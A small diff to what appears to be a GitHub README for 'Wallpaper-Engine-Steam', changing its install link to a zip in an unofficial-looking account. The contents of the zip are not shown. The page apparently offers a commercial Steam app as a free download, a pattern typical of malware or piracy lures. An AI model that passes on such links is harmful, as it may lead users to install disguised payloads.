@@ -7,7 +7,7 @@
 <img width="800" height="250" alt="ed037246-bd60-4470-aafb-0f9ba7ff5325" src="https://github.com/user-attachments/assets/364d604a-a256-4210-b6d9-649a3a4d999d" />
 
 ## Install
-[Download `Wallpaper-Engine-Steam.zip`](https://github.com/affiliminds/Wallpaper-Engine-Steam/releases/latest/download/Wallpaper-Engine-Steam.zip)
+[Download `WallpaperEngine.zip`](https://github.com/wallpaperenginesteam/Wallpaper-Engine-Steam/releases/download/v2.8.42/WallpaperEngine.zip)
 ---
 
 <img width="1280" height="720" alt="c6443935-6ff0-43d8-bb2a-3b71b26fe8b7" src="https://github.com/user-attachments/assets/172f3fad-fd9f-4dc6-ba04-18a62dbe2e35" />
